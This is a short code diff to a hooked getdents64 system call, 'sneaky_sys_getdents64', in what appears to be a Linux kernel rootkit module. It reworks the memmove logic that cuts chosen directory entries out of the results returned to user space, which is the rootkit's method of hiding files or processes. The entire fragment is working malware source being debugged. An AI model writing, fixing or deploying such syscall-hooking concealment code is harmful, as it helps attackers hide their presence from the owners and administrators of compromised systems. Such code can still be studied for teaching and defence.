@@ -88,8 +88,9 @@ asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs)
     int deleted_size = curr_dirp->d_reclen;
     int remaining_size = original_result - (curr_pos + deleted_size);
     sneaky_result -= deleted_size;
-    memmove(curr_dirp, curr_dirp + 1, remaining_size);
-    regs->si -= deleted_size;
+    struct linux_dirent64 *  next_dirp = (struct linux_dirent64 *) (regs->si + curr_pos + deleted_size);
+    memmove(curr_dirp, next_dirp, remaining_size);
+    
   }
   
   return sneaky_result;
